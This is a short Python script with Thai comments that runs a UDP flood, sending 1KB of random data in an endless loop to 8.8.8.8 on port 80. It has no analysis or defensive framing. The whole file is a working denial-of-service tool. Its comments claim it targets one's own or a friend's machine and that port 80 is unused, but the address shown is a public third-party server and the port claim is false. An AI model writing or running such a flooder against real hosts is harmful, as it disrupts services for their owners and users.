import socket
import random
import time

# ตั้งค่าเป้าหมาย (ยิงตัวเอง)
TARGET_IP = "8.8.8.8"  # หรือ IP เครื่องเพื่อน
TARGET_PORT = 80      # พอร์ตมั่วๆ ที่ไม่มีใครใช้

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1024) # สร้างขยะขนาด 1KB

print(f"🚀 Starting UDP Flood on {TARGET_IP}:{TARGET_PORT}")

try:
    while True:
        sock.sendto(bytes_data, (TARGET_IP, TARGET_PORT))
        print(f"Bombing UDP packet...", end='\r')
except KeyboardInterrupt:
    print("\n🛑 Stopped.")